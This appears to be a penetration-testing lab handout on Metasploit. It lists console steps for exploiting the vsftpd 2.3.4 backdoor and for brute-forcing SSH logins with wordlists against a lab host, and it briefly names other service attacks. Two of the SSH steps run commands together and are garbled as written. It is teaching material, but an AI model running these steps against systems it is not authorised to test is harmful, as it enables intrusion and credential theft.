TP4 - Gaining access > Metasploit

The Metasploit framework is a very powerful tool which can be used by cybercriminals as well as ethical hackers to probe systematic vulnerabilities on networks and servers. Because it is an open-source framework, it can be easily customized and used with most operating systems. With Metasploit, the pen testing team can use ready-made or custom code and introduce it into a network to probe for weak spots. As another flavor of threat hunting, once flaws are identified and documented, the information can be used to address systemic weaknesses and prioritize solutions.

VSFTPD

The metasploit framework allows you to exploit some vulnerabilities. You can for example exploit the VSFTPD backdoor. Follow these steps in order to exploit that backdoor :

1- Search vsftpd
2- use exploit/unix/ftp/vsftpd_234_backdoor
3- show options
4- set RHOSTS IP_VISMIN
5- exploit

SSH

This tool also allows you to exploit SSH. Please follow the following steps.

1- Search ssh-login
2- use auxiliary/scanner/ssh/ssh_login
3- setg rhosts IP_VISMIN
4- set USER_FILE /home/kali/FTP_hack/usernames.txtset RHOSTS IP_VISMIN
5- set PASS_FILE /home/kali/FTP_hack/ passwords.txtexploit
6- Exploit

And much more

This framework enables you to exploit much more backdoors. We have seen how to perform NetBIOS-SSN, JAVA-RMI, PostgreSQL, TOMCAT attacks using this framework.
